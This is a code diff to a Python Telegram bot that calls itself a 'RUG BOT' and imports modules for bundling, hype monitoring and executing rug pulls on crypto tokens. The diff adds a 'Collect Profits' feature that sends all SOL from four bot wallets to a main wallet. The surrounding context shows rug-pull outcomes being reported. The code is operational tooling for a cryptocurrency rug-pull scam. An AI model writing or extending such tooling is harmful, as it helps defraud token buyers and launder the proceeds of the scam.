@@ -10,10 +10,11 @@ import os
 try:
     import telebot
     from telebot import types
-    from config import TELEGRAM_TOKEN, RPC_URL
+    from config import TELEGRAM_TOKEN, RPC_URL, MAIN_WALLET
     from modules.bundler import RugBundler
     from modules.monitor import HypeMonitor
     from modules.rugger import RugExecutor
+    from modules.collector import ProfitCollector
 except ImportError as e:
     print(f"\n[ERROR] Import Error: {e}")
     print("\n[INFO] Install dependencies:")
@@ -31,6 +32,7 @@ bot = telebot.TeleBot(TELEGRAM_TOKEN)
 bundler = RugBundler(RPC_URL)
 monitor = HypeMonitor(RPC_URL)
 rugger = RugExecutor(RPC_URL)
+collector = ProfitCollector(RPC_URL)
 
 # Store active token for quick actions
 active_token = {}
@@ -51,14 +53,24 @@ def handle_start(message):
             types.InlineKeyboardButton("Status", callback_data="status")
         )
         
+        # Add Collect Profits button if MAIN_WALLET is configured
+        if MAIN_WALLET and collector.enabled:
+            markup.row(
+                types.InlineKeyboardButton("Collect Profits", callback_data="collect_profits")
+            )
+        
         welcome_text = (
             "RUG BOT READY!\n\n"
             "Commands:\n"
             "- Launch Token: Start wizard\n"
             "- Check Wallets: Funding status\n"
-            "- Status: Bot status\n\n"
-            "All actions available via buttons below!"
+            "- Status: Bot status\n"
         )
+        
+        if MAIN_WALLET and collector.enabled:
+            welcome_text += f"- Collect Profits: Send all SOL to main wallet\n"
+        
+        welcome_text += "\nAll actions available via buttons below!"
         
         bot.reply_to(message, welcome_text, reply_markup=markup)
         print(f"[INFO] /start command processed for chat {message.chat.id}")
@@ -528,6 +540,77 @@ def handle_callback(call):
                 del active_token[chat_id]
             else:
                 bot.send_message(chat_id, f"[ERROR] Rug failed for {mint}")
+        
+        # Collect Profits button
+        elif data == "collect_profits":
+            if not MAIN_WALLET or not collector.enabled:
+                bot.answer_callback_query(call.id, "Collector disabled")
+                bot.send_message(chat_id, "[ERROR] MAIN_WALLET not configured in .env")
+                return
+            
+            bot.answer_callback_query(call.id, "Collecting profits...")
+            
+            # Show confirmation
+            confirm_markup = types.InlineKeyboardMarkup()
+            confirm_markup.row(
+                types.InlineKeyboardButton("CONFIRM COLLECT", callback_data="collect_confirm"),
+                types.InlineKeyboardButton("Cancel", callback_data="cancel")
+            )
+            
+            bot.send_message(
+                chat_id,
+                f"[COLLECT] CONFIRM PROFIT COLLECTION?\n\n"
+                f"This will send ALL SOL from 4 bot wallets to:\n"
+                f"{MAIN_WALLET}\n\n"
+                f"This action cannot be undone!",
+                reply_markup=confirm_markup
+            )
+        
+        # Collect confirmation
+        elif data == "collect_confirm":
+            if not MAIN_WALLET or not collector.enabled:
+                bot.answer_callback_query(call.id, "Collector disabled")
+                return
+            
+            bot.answer_callback_query(call.id, "Collecting...")
+            bot.send_message(chat_id, "[COLLECT] Starting profit collection...")
+            
+            import threading
+            def run_collect():
+                try:
+                    result = asyncio.run(collector.collect_all())
+                    
+                    if result["success"]:
+                        message = (
+                            f"[OK] PROFIT COLLECTION COMPLETE!\n\n"
+                            f"Transferred: {result['transferred']}/4 wallets\n"
+                            f"Total collected: {result['collected']:.6f} SOL\n"
+                            f"Failed: {result['failed']}\n\n"
+                            f"Sent to: {MAIN_WALLET[:16]}..."
+                        )
+                        
+                        # Add details
+                        if result.get("details"):
+                            message += "\n\nDetails:\n"
+                            for detail in result["details"]:
+                                if detail["status"] == "success":
+                                    message += f"  [OK] Wallet {detail['wallet']}: {detail['amount']:.6f} SOL\n"
+                                elif detail["status"] == "skipped":
+                                    message += f"  [SKIP] Wallet {detail['wallet']}: {detail['reason']}\n"
+                                else:
+                                    message += f"  [ERROR] Wallet {detail['wallet']}\n"
+                        
+                        bot.send_message(chat_id, message)
+                    else:
+                        error_msg = result.get("error", "Unknown error")
+                        bot.send_message(chat_id, f"[ERROR] Collection failed: {error_msg}")
+                        
+                except Exception as e:
+                    bot.send_message(chat_id, f"[ERROR] Collection failed: {e}")
+                    print(f"[ERROR] Collect thread error: {e}")
+            
+            collect_thread = threading.Thread(target=run_collect, daemon=True)
+            collect_thread.start()
         
         # Cancel button
         elif data == "cancel":
